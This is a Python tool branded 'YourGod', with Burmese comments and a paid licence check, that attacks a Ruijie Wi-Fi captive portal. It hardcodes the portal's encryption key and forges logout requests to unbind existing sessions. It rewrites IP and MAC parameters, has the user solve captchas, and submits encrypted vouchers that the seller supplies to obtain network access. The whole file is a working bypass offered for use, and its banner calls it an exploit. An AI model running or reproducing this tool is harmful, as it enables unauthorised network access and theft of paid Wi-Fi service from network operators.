import requests
import re
import json
import os
import sys
import time
import hashlib
import base64
import urllib.parse
import io
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
# AES Encryption အတွက် လိုအပ်သော Library များ
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad  # unpad ကို ဖြည့်စွက်ထည့်သွင်းထားပါသည်
from Crypto.Random import get_random_bytes
# PIL Library
from PIL import Image

# --- Terminal Colors & UI Effects (ANSI) ---
GREEN = "\033[1;32m"
NEON_GREEN = "\033[92m"
RED = "\033[1;31m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
WHITE = "\033[1;37m"
MAGENTA = "\033[1;35m"
RESET = "\033[0m"
BOLD = "\033[1m"


class AuthManager:
    def __init__(self, key_url, session_file):
        self.key_url = key_url
        self.session_file = session_file
        self.hwid = self._get_hwid()

    def _get_hwid(self):
        try:
            device_info = os.popen('getprop ro.product.model').read().strip() + \
                          os.popen('getprop ro.serialno').read().strip()
            if not device_info: device_info = "GENERIC-DEVICE-777"
            
            # Hash လုပ်ပြီး 16 လုံးယူ
            raw_id = hashlib.md5(device_info.encode()).hexdigest()[:16].upper()
            
            # ဒီနေရာမှာ Prefix ထည့်ပါ (ဥပမာ: KN-)
            prefix = "MSC-"
            return f"{prefix}{raw_id}"
            
        except: 
            return "ALD-ERROR-ID-000"

    def _calculate_seconds(self, val, unit):
        if unit == 'm': return val * 60
        if unit == 'h': return val * 3600
        if unit == 'd': return val * 86400
        return 0

    def get_remaining_time(self):
        """လက်ကျန်အချိန်ကို ရှာဖွေပြီး HH:MM:SS ပုံစံဖြင့် ပြန်ပေးသည်"""
        if os.path.exists(self.session_file):
            try:
                with open(self.session_file, "r") as f:
                    data = f.read().strip().split('|')
                    if len(data) >= 2:
                        expiry = float(data[1])
                        diff = int(expiry - time.time())
                        if diff > 0:
                            h = diff // 3600
                            m = (diff % 3600) // 60
                            s = diff % 60
                            return f"{h:02d}:{m:02d}:{s:02d}"
            except: pass
        return "00:00:00"

    def check_access(self):
        # ၁။ Local Session စစ်ဆေးခြင်း
        if os.path.exists(self.session_file):
            try:
                with open(self.session_file, "r") as f:
                    data = f.read().strip().split('|')
                    if len(data) >= 2 and data[0] == self.hwid:
                        expiry = float(data[1])
                        if expiry > time.time():
                            return True # Session ရှိသေးရင် ဝင်ခွင့်ပေး
                        else:
                            os.remove(self.session_file) # Expire ဖြစ်ရင် ဖိုင်ဖျက်
            except: pass

        # ၂။ GitHub ကနေ အချက်အလက်ယူပြီး စစ်ဆေးခြင်း
        os.system('clear')
        print(f"\033[1;33m[!] YOUR ID: {self.hwid}\033[0m")
        try:
            response = requests.get(self.key_url, timeout=15)
            for line in response.text.strip().split('\n'):
                if '|' in line:
                    parts = [i.strip() for i in line.split('|')]
                    if len(parts) >= 4 and parts[0] == self.hwid:
                        server_key = parts[1]
                        u_key = input("\033[1;36m[?] Enter Activation Key: \033[0m").strip()
                        
                        if u_key == server_key:
                            expiry_time = time.time() + self._calculate_seconds(int(parts[2]), parts[3].lower())
                            with open(self.session_file, "w") as f:
                                f.write(f"{self.hwid}|{expiry_time}|{server_key}")
                            return True
                        else:
                            print("\033[1;31m[!] Key Invalid! Contact @YourGod77\033[0m")
                            return False
            print("\033[1;31m[!] ID not found on server! Contact @YourGod77\033[0m")
        except Exception as e:
            print(f"\033[1;31m[!] Connection Error: {e}\033[0m")
        return False


class RuijieBypass:
    def __init__(self):
        # 🎯 AUTHENTICATION CHECK FIRST (Object ဆောက်တာနဲ့ လိုင်စင် အရင်စစ်မည်)
        GITHUB_KEY_URL = "https://raw.githubusercontent.com/GodForYou2/Approval/refs/heads/main/key.txt"
        SESSION_FILE_PATH = ".YourGod_session"
        
        auth = AuthManager(key_url=GITHUB_KEY_URL, session_file=SESSION_FILE_PATH)
        if not auth.check_access():
            print(f"\n\033[1;31m[❌] ACCESS DENIED: Telegram @YourGod77 ကို ဆက်သွယ်ပါ\033[0m\n")
            sys.exit(0)
            
        self.hwid = auth.hwid  # _decrypt_voucher တွင် ပြန်လည်အသုံးပြုရန် HWID အား သိမ်းဆည်းခြင်း
        remaining = auth.get_remaining_time()
        print(f"\n\033[1;32m[✓] ACCESS GRANTED! Welcome back to YourGod Control Panel.\033[0m")
        print(f"\033[1;90m[*] License Expiry Timer: [ \033[1;33m{remaining}\033[1;90m ]\033[0m")
        print(f"\033[1;36m[*] Synchronizing environments... Please wait...\033[0m\n")
        time.sleep(1.5)
        
        # Configuration & Endpoints
        self.baseurl = "http://10.44.77.240:2060"
        self.username_get_url = self.baseurl + "/username_get"
        self.online_info_url = self.baseurl + "/user/online_info"
        self.logout_url = self.baseurl + "/user/logout"
        self.enc_key = "RjYkhwzx$2018!"  # CryptoJS အတွက် သုံးထားသော Key
        
        self.target_url = "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=c4b25b228988&gw_sn=H1TB1A600460A&gw_address=10.44.77.240&gw_port=2060&ip=192.168.110.129&mac=30:50:ce:4c:8a:78&slot_num=13&nasip=192.168.1.220&ssid=VLAN233&ustate=0&mac_req=1&url=http%3A%2F%2F192.168.0.1%2F&chap_id=%5C056&chap_challenge=%5C277%5C235%5C363%5C136%5C116%5C263%5C040%5C250%5C130%5C175%5C034%5C101%5C151%5C126%5C215%5C166"
        self.POST_URL = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
        self.VERIFY_URL = "https://portal-as.ruijienetworks.com/api/auth/captcha/verify"
        
        # Captcha Routes
        self.captcha_base = "https://portal-as.ruijienetworks.com/api/auth/captcha"
        self.captcha_paths = [
            f"{self.captcha_base}/image",  
            self.captcha_base,             
            f"{self.captcha_base}/get",    
            f"{self.captcha_base}/code"    
        ]
        
        self.headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://portal-as.ruijienetworks.com",
            "Content-Type": "application/json"
        }
        self.session = requests.Session()
        self.session.headers.update(self.headers)

    def print_banner(self):
        """ Premium Cyberpunk Ascii Banner """
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"{CYAN}┌──────────────────────────────────────────────────┐{RESET}")
        print(f"{NEON_GREEN}  ██╗   ██╗ ██████╗ ██╗   ██╗██████╗  ██████╗ ██████╗ {RESET}")
        print(f"{NEON_GREEN}  ╚██╗ ██╔╝██╔═══██╗██║   ██║██╔══██╗██╔════╝ ██╔══██╗{RESET}")
        print(f"{NEON_GREEN}   ╚████╔╝ ██║   ██║██║   ██║██████╔╝██║  ███╗██║  ██║{RESET}")
        print(f"{NEON_GREEN}    ╚██╔╝  ██║   ██║██║   ██║██╔══██╗██║   ██║██║  ██║{RESET}")
        print(f"{NEON_GREEN}     ██║   ╚██████╔╝╚██████╔╝██║  ██║╚██████╔╝██████╔╝{RESET}")
        print(f"{NEON_GREEN}     ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ {RESET}")
        print(f"{CYAN}├──────────────────────────────────────────────────┤{RESET}")
        print(f"{WHITE}  {BOLD}SYSTEM ARCHITECTURE : Ruijie Captive Portal{RESET}")
        print(f"{WHITE}  {BOLD}EXPLOIT CODENAME    : YourGod Wi-Fi Core{RESET}")
        print(f"{CYAN}├──────────────────────────────────────────────────┤{RESET}")
        print(f"{MAGENTA}  [⚡] DEVELOPER : YourGod      [📱] TELEGRAM : @YourGod77{RESET}")
        print(f"{CYAN}└──────────────────────────────────────────────────┘{RESET}\n")

    def unbind(self):
        print(f"{YELLOW}[⚙️] Initializing deep unbind sequence...{RESET}")
        username = self.username_get()
        if not username:
            return False
        online_info = self.get_online_info(username)
        if not online_info:
            return False
        data = self.arrange_data(online_info)
        return self.logout(data, username)

    def username_get(self):
        try:
            req = requests.get(self.username_get_url, timeout=5).json()
            return req.get("username", None)
        except:
            return None

    def get_online_info(self, username):
        params = {"username": username, "usertype": "wifidog"}
        try:
            req = requests.get(self.online_info_url, params=params, timeout=5).json()
            return req["data"]["list"][0]
        except:
            return None

    def arrange_data(self, info):
        repmac = info["mac"].replace(":", "")
        repmac = [repmac[i:i+4] for i in range(0, len(repmac), 4)]
        mac_req = ".".join(repmac)
        return {
            "ip": info["ip"],
            "mac": info["mac"],
            "ip_req": info["ip"],
            "mac_req": mac_req
        }

    def get_data(self):
        try:
            return requests.get(self.baseurl, timeout=5).text
        except:
            return None

    def extract_chap(self, data):
        match = re.search(r"chap_id=([^&]+)&chap_challenge=([^']+)", data)
        if not match:
            return None
        return {"chap_id": match.group(1), "chap_challenge": match.group(2)}

    def encrypt_cryptojs(self, auth, enc_key):
        salt = get_random_bytes(8)
        key_iv = b''
        prev = b''
        while len(key_iv) < 48:
            prev = hashlib.md5(prev + enc_key.encode("utf-8") + salt).digest()
            key_iv += prev
        key = key_iv[:32]
        iv = key_iv[32:48]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        padded_data = pad(auth.encode("utf-8"), AES.block_size)
        cipher_text = cipher.encrypt(padded_data)
        encrypted_data = b"Salted__" + salt + cipher_text
        return base64.b64encode(encrypted_data).decode("utf-8")

    def get_auth(self, username):
        data = self.get_data()
        if not data:
            print(f"{RED}[──] Error: Failed to retrieve gateway data.{RESET}")
            return None
        chaps = self.extract_chap(data)
        if not chaps:
            print(f"{RED}[──] Error: Failed to extract chap_id and chap_challenge.{RESET}")
            return None
        chap_id_decoded = urllib.parse.unquote(chaps["chap_id"])
        chap_challenge_decoded = urllib.parse.unquote(chaps["chap_challenge"])
        auth = chap_id_decoded + chap_challenge_decoded + username
        return self.encrypt_cryptojs(auth, self.enc_key)

    def logout(self, data, username):
        auth = self.get_auth(username)
        if not auth:
            return False
        payload = f"ip={data['ip']}&mac={data['mac']}&ip_req={data['ip_req']}&mac_req={data['mac_req']}&auth={auth}"
        try:
            respond = requests.post(self.logout_url, data=payload, timeout=5).json()
            return bool(respond.get("success"))
        except:
            return False

    # --- 🖼️ CRISP BRAILLE CAPTCHA RENDERER ---
    
    
    def display_ascii_captcha(self, image_bytes):
        """
        [ PERFECT BACKGROUND COLOR BRAILLE VERSION ]
        စာလုံးကိုယ်ထည်ကို ကွက်လပ်ချန်ပြီး ဘေးပတ်ပတ်လည်ရှိ နောက်ခံအစက်များကိုသာ
        တောက်ပသော အရောင်ပြောင်းလဲပေးခြင်းဖြင့် စာလုံးကို အရှင်းလင်းဆုံး ပုံဖော်ပေးသည့် ကုဒ်ဖြစ်သည်။
        """
        import io
        from PIL import Image
    
        # 🌟 အစ်ကို ကြိုက်တဲ့ အရောင်ကို ဒီနေရာမှာ ပြောင်းလဲနိုင်ပါတယ် 🌟
        BG_COLOR = "\033[36m"     # CYAN (အပြာနုရောင် အစက်နောက်ခံ)
        # BG_COLOR = "\033[32m"   # GREEN ပြောင်းချင်ရင် ဒါလေးသုံးပါ
        
        CYAN = "\033[36m"
        WHITE = "\033[37m"
        RESET = "\033[0m"
        RED = "\033[31m"
    
        try:
            img = Image.open(io.BytesIO(image_bytes))
            img = img.convert("L")  # Grayscale
    
            # Braille စနစ်အတွက် အကျစ်လစ်ဆုံး Size
            target_width = 56
            target_height = 16
            img = img.resize((target_width, target_height), Image.Resampling.LANCZOS)
            
            # Threshold ချိန်ညှိခြင်း (120 သည် စာလုံးလိုင်းများကို ပိန်သွယ်ရှင်းလင်းစေပါသည်)
            img = img.point(lambda x: 0 if x < 120 else 255)
    
            # 🌟 Unicode Braille Matrix Engine 🌟
            output = []
            for y in range(0, target_height, 4):
                line = ""
                for x in range(0, target_width, 2):
                    # 2x4 Grid တစ်ခုချင်းစီအတွင်းရှိ အစက်များကို စစ်ဆေးခြင်း
                    pixels = []
                    for dy in range(4):
                        for dx in range(2):
                            if (x + dx < target_width) and (y + dy < target_height):
                                # 0 သည် စာလုံး (အမည်း) ဖြစ်ပြီး 255 သည် နောက်ခံ (အဖြူ) ဖြစ်သည်
                                # အစ်ကိုဖြစ်ချင်သည့်အတိုင်း နောက်ခံ (အဖြူရောင်နေရာ) ကိုသာ အစက်တင်မည်
                                pixels.append(1 if img.getpixel((x + dx, y + dy)) != 0 else 0)
                            else:
                                pixels.append(1)
    
                    # Unicode Braille ရိုက်ထည့်ရန်အတွက် Bitmask တွက်ချက်ခြင်း
                    braille_char = 0x2800
                    if pixels[0]: braille_char |= 0x01
                    if pixels[2]: braille_char |= 0x02
                    if pixels[4]: braille_char |= 0x04
                    if pixels[1]: braille_char |= 0x08
                    if pixels[3]: braille_char |= 0x10
                    if pixels[5]: braille_char |= 0x20
                    if pixels[6]: braille_char |= 0x40
                    if pixels[7]: braille_char |= 0x80
    
                    # 🌟 [နောက်ခံကိုသာ အရောင်ပြောင်းလဲခြင်း] 🌟
                    # စာလုံးနေရာများတွင် အစက်မရှိဘဲ ကွက်လပ်ဖြစ်နေမည်ဖြစ်ပြီး နောက်ခံအစက်များကိုသာ BG_COLOR အရောင်ခြယ်ပါမည်
                    line += f"{BG_COLOR}{chr(braille_char)}{RESET}"
                        
                output.append(line)
    
            # Console ဘောင်အတွင်း စနစ်တကျ ပုံထုတ်ခြင်း
            border_line = "─" * 28
            title_text = " [ CAPTCHA CODE ] "
            remaining_space = 28 - len(title_text)
            
            left_border = "─" * (remaining_space // 2)
            right_border = "─" * (remaining_space - len(left_border))
            top_header = f"┌─{left_border}{title_text}{right_border}─┐"
                
            print(f"\n{CYAN}{top_header}{RESET}")
            print(f"  {WHITE}┌{border_line}┐{RESET}")
            for row in output:
                if row.strip():
                    # Termux တွင် ဘေးဘောင်မလျှံစေရန် ဘယ်ဘက်မှ ၄ ကွက်အကွာ၌ ပုံထုတ်ခြင်း
                    print(f"    {row}")
            print(f"  {WHITE}└{border_line}┘{RESET}")
            print(f"{CYAN}└" + "─" * 32 + f"┘{RESET}\n")
    
        except Exception as e:
            print(f"{RED}[──] Captcha Render Error: {e}{RESET}")
                
            
            
            
            
    # --- 🔐 ENCRYPTED VOUCHER DECRYPTION FUNCTION ---
    def _decrypt_voucher(self, encrypted_voucher, secret_key="yg224228"):
        """ Encrypted Voucher ကုဒ်ကို HWID စနစ်သုံး၍ AES ဖြင့် ပြန်ဖြေပေးသည် """
        try:
            combined_key = hashlib.sha256((self.hwid + secret_key).encode()).digest()
            iv = hashlib.md5(secret_key.encode()).digest()
            cipher = AES.new(combined_key, AES.MODE_CBC, iv)
            
            encrypted_bytes = base64.b64decode(encrypted_voucher)
            decrypted_bytes = unpad(cipher.decrypt(encrypted_bytes), AES.block_size)
            return decrypted_bytes.decode().strip()
        except:
            print(f"\n{RED}[──] Error: Encrypted Voucher ကုဒ် မှားယွင်းနေပါသည် သို့မဟုတ် HWID မကိုက်ညီပါ။{RESET}")
            return None
            
    # --- 🚀 LOGIN & CORE CONSOLE MECHANISM ---
    def do_login(self):
        try:
            status = self.unbind()
            if not status:
                print(f"{YELLOW}[i] Notice: No active lease found or cleared. Advancing...{RESET}")
            else:
                print(f"{NEON_GREEN}[✓] Success: Active lease flushed and unbound.{RESET}")
                print(f"{YELLOW}[⚙️] Syncing network gateway state (3s)...{RESET}")
                time.sleep(3)
            
            print(f"{YELLOW}[⚙️] Sniffing network interface properties...{RESET}")
            response = self.session.get(self.baseurl, timeout=10)
            html_content = response.text
            
            ip_match = re.search(r"ip=([\d\.]+)", html_content)
            mac_match = re.search(r"mac=([0-9a-zA-Z\.]+)", html_content)
            
            if ip_match and mac_match:
                extracted_ip = ip_match.group(1)
                raw_mac = mac_match.group(1)
                
                clean_mac = re.sub(r'[^a-zA-Z0-9]', '', raw_mac)
                formatted_mac = ':'.join(clean_mac[i:i+2] for i in range(0, len(clean_mac), 2))
                
                print(f"{CYAN}┌────────────────────────────────────────┐{RESET}")
                print(f"{WHITE}  TARGET INITIALIZATION DATA:{RESET}")
                print(f"{NEON_GREEN}  ► METRIC IP  : {extracted_ip}{RESET}")
                print(f"{NEON_GREEN}  ► METRIC MAC : {formatted_mac}{RESET}")
                print(f"{CYAN}└────────────────────────────────────────┘{RESET}")
                
                parsed_url = urlparse(self.target_url)
                query_params = parse_qs(parsed_url.query)
                query_params['ip'] = [extracted_ip]
                query_params['mac'] = [formatted_mac]
                
                new_query_string = urlencode(query_params, doseq=True)
                replaced_url = urlunparse(parsed_url._replace(query=new_query_string))
                
                print(f"{YELLOW}[⚙️] Extracting unique token from remote database...{RESET}")
                portal_res = self.session.get(replaced_url, allow_redirects=True, timeout=15)
                
                final_url = str(portal_res.url)
                session_id_match = re.search(r"[?&]sessionId=([a-zA-Z0-9_-]+)", final_url)
                session_id = session_id_match.group(1) if session_id_match else None
                
                if not session_id:
                    for hist in portal_res.history:
                        hist_match = re.search(r"[?&]sessionId=([a-zA-Z0-9_-]+)", str(hist.url))
                        if hist_match:
                            session_id = hist_match.group(1)
                            break
                
                if session_id:
                    print(f"{NEON_GREEN}[✓] Token Payload Acknowledged: {session_id}{RESET}\n")
                    
                    # ဝှက်စာ (Encrypted) ကုဒ်ကို တောင်းယူပြီး Decrypt ပြန်လုပ်သည့် စနစ်
                    encrypted_input = input(f"{WHITE}YourGod_Console# Enter KEY: {RESET}").strip()
                    voucher = self._decrypt_voucher(encrypted_input)
                    if not voucher:
                        return  # ကုဒ်မှားယွင်းလျှင် သို့မဟုတ် ဖြေမရလျှင် ရှေ့ဆက်မသွားစေရန် ရပ်တန့်မည်
                    
                    # --- 🎯 [DYNAMIC CAPTCHA CHECKING SYSTEM] ---
                    captcha_payload = {"sessionId": session_id}
                    verify_res = self.session.post(self.VERIFY_URL, json=captcha_payload, timeout=10)
                    
                    try:
                        verify_data = verify_res.json()
                        #print(f"{CYAN}[i] Router Response: {json.dumps(verify_data)}{RESET}")
                    except:
                        verify_data = {}
                    
                    # စာလုံးကြီးအသေးမရွေး (Case-insensitive) နှင့် ပြည့်စုံစွာ စစ်ဆေးခြင်း
                    is_captcha_required = False
                    if "object" in verify_data and isinstance(verify_data["object"], dict):
                        if verify_data["object"].get("checkCaptcha") is True:
                            is_captcha_required = True
                    
                    msg_text = str(verify_data.get("message", "")).lower()
                    if "request limited" in msg_text or "captcha" in msg_text or verify_res.status_code == 429:
                        is_captcha_required = True
                    elif verify_data.get("success") is False and msg_text == "ok.":
                        is_captcha_required = True
                        #print(f"{YELLOW}[!] Hidden Request Limit Detected (success=false, message='ok.').{RESET}")
                        
                    # Router ကနေ Captcha တောင်းလျှင် လုပ်ဆောင်မည့် Dynamic Loop အပိုင်း
                    if is_captcha_required:
                        #print(f"{YELLOW}[⚠️] Captcha Triggered! Initiating Visual Image Stream...{RESET}")
                        
                        img_headers = {
                            'authority': 'portal-as.ruijienetworks.com',
                            'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
                            'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}',
                            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
                        }
                        
                        verify_headers = {
                            'authority': 'portal-as.ruijienetworks.com',
                            'accept': '*/*',
                            'content-type': 'application/json',
                            'origin': 'https://portal-as.ruijienetworks.com',
                            'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}',
                            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
                        }

                        # ပေးထားသော Logic အတိုင်း Max 8 ကြိမ်အထိ စမ်းသပ်ရန် Loop ပတ်ခြင်း
                        auth_code = None
                        for attempt in range(8):
                            try:
                                img_params = {
                                    'sessionId': session_id,
                                    '_t': str(time.time()),
                                }
                                captcha_img_url = 'https://portal-as.ruijienetworks.com/api/auth/captcha/image'
                                img_res = self.session.get(captcha_img_url, params=img_params, headers=img_headers, timeout=10)
                                
                                if img_res.status_code == 200 and len(img_res.content) > 10:
                                    # ကွန်ဆိုးပေါ်မှာ ပုံဖော်ပေးခြင်း
                                    self.display_ascii_captcha(img_res.content)
                                    
                                    # လူကိုယ်တိုင် ကုဒ်မှန် ရိုက်ထည့်ခြင်း
                                    captcha_code = input(f"{WHITE}YourGod_Console# [Attempt {attempt+1}/8] Enter Captcha Code: {RESET}").strip()
                                    if not captcha_code:
                                        print(f"{RED}[──] Input empty, skipping item...{RESET}")
                                        continue
                                    
                                    verify_json_data = {
                                        'sessionId': session_id,
                                        'authCode': captcha_code,
                                    }
                                    
                                    print(f"{YELLOW}[⚙️] Submitting code to authorization gateway...{RESET}")
                                    v_res = self.session.post(self.VERIFY_URL, headers=verify_headers, json=verify_json_data, timeout=10)
                                    v_data = v_res.json() if v_res.status_code == 200 else {}
                                    
                                    if v_data.get("success") == True:
                                        print(f"{NEON_GREEN}[✓] Captcha Verification Passed!{RESET}")
                                        auth_code = captcha_code
                                        break  # ကုဒ်မှန်သွားရင် Loop ထဲက ထွက်မယ်
                                    else:
                                        print(f"{RED}[──] Invalid Captcha Code. Regenerating visual chart...{RESET}")
                                else:
                                    print(f"{RED}[──] Captcha Image Stream Dropped. Retrying...{RESET}")
                            except Exception as e:
                                print(f"{RED}[──] Dynamic Stream Error: {e}{RESET}")
                                continue
                        
                        if not auth_code:
                            print(f"{RED}[──] Error: Max verification attempts exhausted. Exiting process.{RESET}")
                            return

                        # Login လုပ်ရန် Payload ပြင်ဆင်ခြင်း
                        print(f"\n{YELLOW}[⚙️] Compiling final payload properties...{RESET}")
                        payload = {
                            "accessCode": voucher,
                            "sessionId": session_id,
                            "apiVersion": 1,
                            "authCode": auth_code,
                            "captchaCode": auth_code
                        }
                    else:
                        # Captcha တောင်းမထားလျှင် သွားမည့် သာမန် Payload
                        payload = {
                            "accessCode": voucher,
                            "sessionId": session_id,
                            "apiVersion": 1
                        }
                    
                    self.session.headers.update({
                        "Referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}"
                    })
                    
                    login_res = self.session.post(self.POST_URL, json=payload, timeout=15)
                    res_data = login_res.json()
                    
                    if res_data.get("success") is True and "result" in res_data:
                        result_obj = res_data["result"]
                        logon_url = result_obj.get("logonUrl")
                        
                        if logon_url:
                            self.session.get(logon_url, allow_redirects=True, timeout=15)
                            print(f"\n{CYAN}┌──────────────────────────────────────────────────┐{RESET}")
                            print(f"{NEON_GREEN}  [✓] Success code, use the wifi!                  {RESET}")
                            print(f"{WHITE}  [*] Authorization parameters matching perfectly.  {RESET}")
                            print(f"{WHITE}  [*] Secured session locked by YourGod.           {RESET}")
                            print(f"{MAGENTA}  [⚡] Support: Telegram @YourGod77                 {RESET}")
                            print(f"{CYAN}└──────────────────────────────────────────────────┘{RESET}\n")
                        else:
                            print(f"{RED}[──] Payload Error: Invalid response mapping.{RESET}")
                    else:
                        final_msg = res_data.get("message", "Authentication Dropped")
                        print(f"\n{RED}[──] Exploit Failed: {final_msg}{RESET}")
                else:
                    print(f"{RED}[──] Error: Token extraction failure.{RESET}")
            else:
                print(f"{RED}[──] Error: Interface mismatched (Check Access Point).{RESET}")
        except Exception as e:
            print(f"\n{RED}[──] Critical System Exception: {e}{RESET}")

    # --- 🎯 [DIRECT EXECUTOR] ဖြတ်လမ်းစနစ် ---
    def start_process(self):
        """ Choice Operations မလုပ်တော့ဘဲ Banner ပြပြီး ပတ်လမ်းကြောင်းကို တိုက်ရိုက် Run စေခြင်း """
        self.print_banner()
        self.do_login()


if __name__ == "__main__":
    # Script စတင်သည်နှင့် ရွေးချယ်စရာမလိုဘဲ တိုက်ရိုက် အလုပ်လုပ်စေခြင်း
    bypass = RuijieBypass()
    bypass.start_process()
